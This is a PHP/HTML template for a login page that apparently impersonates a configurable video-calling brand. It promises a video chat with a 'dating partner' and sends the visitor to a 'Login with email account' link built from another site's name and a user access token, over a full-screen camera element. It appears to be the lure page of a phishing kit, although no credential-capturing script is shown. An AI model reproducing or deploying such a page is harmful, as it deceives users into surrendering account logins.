<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home - Login</title>
    <link rel="icon" type="image/png" href="<?= $videoCalling['image'] ?>">
    <link rel="icon" type="image/svg" href="<?= $videoCalling['image'] ?>">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        #camera {
            object-fit: cover;
            width: 100vw;
            height: 100vh;
            position: fixed;
            top: 0;
            left: 0;
            z-index: -1;
        }
    </style>
</head>

<body>
<div id="mainSystem" class="h-screen z-1 relative flex items-center justify-center">
    <video id="camera" playsinline="" autoplay=""></video>
    <div id="videoChatBlock" class=" max-w-[400px] bg-white rounded">
        <div class="p-5 ">
            <div class="mx-auto flex items-center justify-center mt-5">
                <img class="h-16 w-16 text-center" src='<?= $videoCalling['image'] ?>' alt="">
            </div>
            <h2 class="text-3xl font-bold text-blue-900 text-center capitalize"><?= str_replace('_', ' ', $videoCalling['name']) ?></h2>
            <p class="text-xl pt-5 font-semibold text-[#707b8e]">
                Login With Email and enjoy with  <b class='text-[<?= $videoCalling['color'] ?>]'><span class="text-nowrap capitalize"><?= str_replace('_', ' ', $videoCalling['name']) ?></span> video chat</b>
                your dating partner.
            </p>
            <a href="<?= url("{$site['name']}/login/{$videoCalling['name']}?id={$user_access_token}") ?>" class="flex items-center justify-center gap-5 p-2 my-5 w-full bg-[<?= $videoCalling['color'] ?>] text-xl font-semibold text-white rounded-md">
                <div class="flex justify-center items-center gap-3">
                    <?php if($site['image']): ?>
                        <img class="size-9 text-center" src='<?= $site['image'] ?>' alt="">
                    <?php endif; ?>
                    <span>Login with email account</span>
                </div>
            </a>
        </div>
    </div>
</div>
</body>
</html>
